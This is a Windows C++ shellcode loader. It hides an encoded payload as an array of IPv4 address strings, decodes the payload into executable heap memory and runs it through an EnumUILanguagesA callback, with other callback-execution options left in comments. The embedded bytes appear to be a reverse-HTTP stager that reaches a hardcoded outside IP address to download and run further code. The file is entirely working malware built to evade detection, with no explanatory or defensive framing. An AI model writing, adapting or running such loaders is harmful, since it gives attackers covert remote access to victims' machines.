#include <Windows.h>
#include <iostream>
#include <ip2string.h>
#pragma comment(lib, "Ntdll.lib")


//  shellcode -> ipv4
const char* ipv4[] =
{
    "252.72.131.228", "240.232.200.0", "0.0.65.81", "65.80.82.81", "86.72.49.210", "101.72.139.82", "96.72.139.82", "24.72.139.82", "32.72.139.114", "80.72.15.183", "74.74.77.49", "201.72.49.192", "172.60.97.124", "2.44.32.65", "193.201.13.65", "1.193.226.237", "82.65.81.72", "139.82.32.139", "66.60.72.1", "208.102.129.120", "24.11.2.117", "114.139.128.136", "0.0.0.72", "133.192.116.103", "72.1.208.80", "139.72.24.68", "139.64.32.73", "1.208.227.86", "72.255.201.65", "139.52.136.72", "1.214.77.49", "201.72.49.192", "172.65.193.201", "13.65.1.193", "56.224.117.241", "76.3.76.36", "8.69.57.209", "117.216.88.68", "139.64.36.73", "1.208.102.65", "139.12.72.68", "139.64.28.73", "1.208.65.139", "4.136.72.1", "208.65.88.65", "88.94.89.90", "65.88.65.89", "65.90.72.131", "236.32.65.82", "255.224.88.65", "89.90.72.139", "18.233.79.255", "255.255.93.106", "0.73.190.119", "105.110.105.110", "101.116.0.65", "86.73.137.230", "76.137.241.65", "186.76.119.38", "7.255.213.72", "49.201.72.49", "210.77.49.192", "77.49.201.65", "80.65.80.65", "186.58.86.121", "167.255.213.233", "147.0.0.0", "90.72.137.193", "65.184.187.1", "0.0.77.49", "201.65.81.65", "81.106.3.65", "81.65.186.87", "137.159.198.255", "213.235.121.91", "72.137.193.72", "49.210.73.137", "216.77.49.201", "82.104.0.50", "192.132.82.82", "65.186.235.85", "46.59.255.213", "72.137.198.72", "131.195.80.106", "10.95.72.137", "241.186.31.0", "0.0.106.0", "104.128.51.0", "0.73.137.224", "65.185.4.0", "0.0.65.186", "117.70.158.134", "255.213.72.137", "241.72.137.218", "73.199.192.255", "255.255.255.77", "49.201.82.82", "65.186.45.6", "24.123.255.213", "133.192.15.133", "157.1.0.0", "72.255.207.15", "132.140.1.0", "0.235.179.233", "228.1.0.0", "232.130.255.255", "255.47.108.122", "54.65.0.247", "96.89.109.156", "120.7.20.127", "144.60.181.242", "209.153.157.145", "194.102.196.110", "23.63.184.67", "179.238.69.40", "239.143.206.123", "91.6.145.44", "46.164.42.231", "104.222.185.242", "130.222.174.158", "145.231.245.48", "56.159.107.228", "64.90.7.188", "207.21.145.153", "224.95.148.62", "0.165.15.253", "0.85.115.101", "114.45.65.103", "101.110.116.58", "32.77.111.122", "105.108.108.97", "47.53.46.48", "32.40.99.111", "109.112.97.116", "105.98.108.101", "59.32.77.83", "73.69.32.49", "48.46.48.59", "32.87.105.110", "100.111.119.115", "32.78.84.32", "54.46.50.59", "32.87.105.110", "54.52.59.32", "120.54.52.59", "32.84.114.105", "100.101.110.116", "47.54.46.48", "59.32.77.65", "65.82.74.83", "41.13.10.0", "113.228.251.196", "58.198.106.53", "14.148.214.212", "54.120.247.73", "157.85.38.149", "172.70.251.5", "106.246.88.92", "159.49.139.238", "67.46.249.240", "140.106.72.106", "240.232.137.136", "21.50.23.107", "229.88.1.183", "108.176.150.196", "127.73.81.52", "40.94.185.152", "124.77.186.28", "226.53.69.37", "113.218.75.31", "127.103.183.125", "158.176.168.127", "11.237.138.92", "18.169.98.90", "9.129.183.185", "16.179.139.221", "152.233.111.98", "30.169.137.47", "250.159.38.102", "22.177.59.208", "176.195.50.177", "224.13.249.163", "65.0.35.208", "113.113.192.26", "115.241.64.4", "59.174.87.22", "124.66.12.72", "49.151.96.122", "172.96.197.199", "133.98.186.188", "239.254.98.164", "125.14.121.117", "75.71.184.109", "66.72.223.74", "51.100.208.134", "59.41.177.155", "222.220.154.182", "204.28.54.222", "81.12.79.164", "131.133.133.175", "125.35.28.86", "219.134.190.145", "0.65.190.240", "181.162.86.255", "213.72.49.201", "186.0.0.64", "0.65.184.0", "16.0.0.65", "185.64.0.0", "0.65.186.88", "164.83.229.255", "213.72.147.83", "83.72.137.231", "72.137.241.72", "137.218.65.184", "0.32.0.0", "73.137.249.65", "186.18.150.137", "226.255.213.72", "131.196.32.133", "192.116.182.102", "139.7.72.1", "195.133.192.117", "215.88.88.88", "72.5.0.0", "0.0.80.195", "232.127.253.255", "255.49.46.49", "53.46.56.48", "46.49.48.50", "0.73.150.2", "210.0.0.0"
};


int main()
{
    HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    void* ha = HeapAlloc(hc, 0, 0x100000);
    DWORD_PTR hptr = (DWORD_PTR)ha;
    int elems = sizeof(ipv4) / sizeof(ipv4[0]);
    PCSTR Terminator = "";

    for (int i = 0; i < elems; i++) {

        if (RtlIpv4StringToAddressA(ipv4[i], FALSE, &Terminator, (in_addr*)hptr) == STATUS_INVALID_PARAMETER)
        {
            printf("ERROR!");
            return 0;
        }
        hptr += 4;
    }

    // EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, 0);
    // EnumTimeFormatsA((TIMEFMT_ENUMPROCA)ha, 0, 0);
    // EnumWindows((WNDENUMPROC)ha, 0);
    // EnumDesktopWindows(NULL,(WNDENUMPROC)ha, 0);
    // EnumThreadWindows(0, (WNDENUMPROC)ha, 0);
    // EnumSystemGeoID(0, 0, (GEO_ENUMPROC)ha);
    // EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)ha, 0, 0);
    EnumUILanguagesA((UILANGUAGE_ENUMPROCA)ha, 0, 0);
    // EnumSystemCodePagesA((CODEPAGE_ENUMPROCA)ha, 0);
    // EnumDesktopsW(NULL,(DESKTOPENUMPROCW)ha, NULL);
    // EnumSystemCodePagesW((CODEPAGE_ENUMPROCW)ha, 0);
    // EnumDateFormatsA((DATEFMT_ENUMPROCA)ha, 0, 0);
    // EnumChildWindows(NULL, (WNDENUMPROC)ha, 0);
    // CloseHandle(ha);
    return 0;
}



